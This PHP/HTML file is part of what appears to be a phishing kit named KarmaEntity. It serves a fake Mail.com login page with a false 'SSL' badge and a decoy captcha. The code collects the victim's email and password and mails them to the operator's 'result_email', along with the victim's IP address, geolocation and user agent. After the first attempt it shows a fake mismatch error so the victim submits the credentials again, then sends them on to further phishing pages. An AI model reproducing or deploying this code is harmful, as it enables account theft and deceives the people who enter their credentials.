<?php
require "core/EntityVariables.php";
$config = require "KarmaEntity/config/config.php";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_SESSION['first_submit'])) {
        $_SESSION['first_submit'] = true;
        $_SESSION['karma-emailaccess1'] = htmlspecialchars($_POST['karma-emailaccess'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-emailpassword1'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');
        $data = [
            'karma-emailaccess1' => $_SESSION['karma-emailaccess1'],
            'karma-emailpassword1' => $_SESSION['karma-emailpassword1'],
        ];

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">EMAIL AKSES INFO #1</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Email    : ' . htmlspecialchars($data['karma-emailaccess1']) . "\n"
            .'Password : ' . htmlspecialchars($data['karma-emailpassword1']) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';
        $to = $config['result_email'];
        $subject = 'EMAIL #1 :: ' . $data['karma-emailaccess1'] . ' :: [ ' . $country . ' - ' . $ip . ' ]';
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Entity <karma@entity.net>\r\n";
        mail($to, $subject, $message, $headers);
        EntityMessage("EMAIL #1 RECEIVED", $ip);
        header("Location: /mail");
        exit();
    } else {
        unset($_SESSION['first_submit']);
        $_SESSION['karma-emailaccess2'] = htmlspecialchars($_POST['karma-emailaccess'], ENT_QUOTES, 'UTF-8');
        $_SESSION['karma-emailpassword2'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');
        $data = [
            'karma-emailaccess2' => $_SESSION['karma-emailaccess2'],
            'karma-emailpassword2' => $_SESSION['karma-emailpassword2'],
        ];

        $message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
            .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
            .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">EMAIL AKSES INFO #2</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'Email    : ' . htmlspecialchars($data['karma-emailaccess2']) . "\n"
            .'Password : ' . htmlspecialchars($data['karma-emailpassword2']) . "\n"
            .'</code>'
            .'</pre>'
            .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
            .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
            .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
            .'IP           : ' . htmlspecialchars($ip) . "\n"
            .'Country      : ' . htmlspecialchars($country) . "\n"
            .'City         : ' . htmlspecialchars($city) . "\n"
            .'Region       : ' . htmlspecialchars($region) . "\n"
            .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
            .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
            .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
            .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
            .'</code>'
            .'</pre>'
            .'</div>';
        $to = $config['result_email'];
        $subject = 'EMAIL #2 :: ' . $data['karma-emailaccess2'] . ' :: [ ' . $country . ' - ' . $ip . ' ]';
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Entity <karma@entity.net>\r\n";
        mail($to, $subject, $message, $headers);
        EntityMessage("EMAIL #2 RECEIVED", $ip);
        if ($config['feature'] === 'prime') {
            header("Location: /secure?entityId=$random_entity_id");
            exit();
        } else {
            header("Location: /yourAddress?entityId=$random_entity_id");
            exit();
        }
    }
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Mail.com | Free Mail Service</title>
        <link rel="icon" href="/public/images/mail.ico" type="image/ico">
        <link rel="stylesheet" href="/public/css/1.css?v=<?= time() ?>">
        <link rel="stylesheet" href="/public/css/custom.css?v=<?= time() ?>">
    </head>
    <body class="font-helevetica container">

        <header class="flex flex-col w-full">
            <div class="bg-white px-10 w-full z-10 flex justify-between items-center mx-auto border-b border-b-stone-300 py-5">
                <p class="text-black"> MENU </p>
                <img src="/public/images/mail.png" alt="Logo" class="w-26" />
                <p class="text-black"> Support </p>
            </div>
        </header>

        <form action="" method="post" id="emailaccess-form" class="flex flex-col justify-center mt-13 items-center p-2 mx-auto max-w-xs">
            <main>
                <?php if (isset($_SESSION['first_submit'])): ?>
                    <div class="flex gap-2 border p-6 text-red-600 text-sm font-bold mb-5">
                        <img src="/public/images/warning-red.svg" alt="Alert" class="h-5 w-5 mr-2 mt-3 fill-red-600" />
                        <p class="">The info you entered doesn't match our records. Please try again.</p>
                    </div>
                <?php endif; ?>
                <div class="flex items-center mb-5">
                    <h1 class="text-stone-700 text-xl font-bold font-arial text-center mr-2">
                        Login <h1 class="text-[#008000] font-bold text-xl">SSL</h1>
                    </h1>
                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24">
                        <path d="M6 12.5l4 4 8-9" stroke="#008000" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>

                <div class="flex flex-col gap-2 mb-5">
                    <div>
                        <label for="karma-emailaccess" class="block mb-1 text-sm text-[#646469] font-helevetica">Email</label>
                        <input type="email" name="karma-emailaccess" id="karma-emailaccess" class="w-[300px] h-7 border-1 border-stone-600 rounded-xs px-3" required />
                    </div>
                    <div>
                        <label for="karma-emailpassword" class="block mb-1 text-sm text-[#646469] font-helevetica">Password</label>
                        <input type="password" name="karma-emailpassword" id="karma-emailpassword" class="w-[300px] h-7 border-1 border-stone-600 rounded-xs px-3" required />
                    </div>
                </div>

                <div class="flex items-center justify-between border mt-5 border-stone-200 p-2">
                    <div class="flex items-center gap-4 px-3">
                        <input type="checkbox" id="not-robot" name="not-robot" class="w-4 h-4 border border-stone-600 rounded-sm cursor-pointer" required>
                        <label for="not-robot" class="font-helevetica text-md text-[#646469] cursor-pointer">I'm not a robot</label>
                    </div>
                    <img src="/public/images/captcha.svg" alt="Captcha" class="relative right- h-12 w-12" />
                </div>
                <button type="submit" class="flex items-center bg-[#008000] text-sm justify-center text-white py-2 px-8 rounded mt-6 h-8 cursor-pointer tracking-wider w-full">Log in</button>
            </main>
        </form>
    </body>
</html>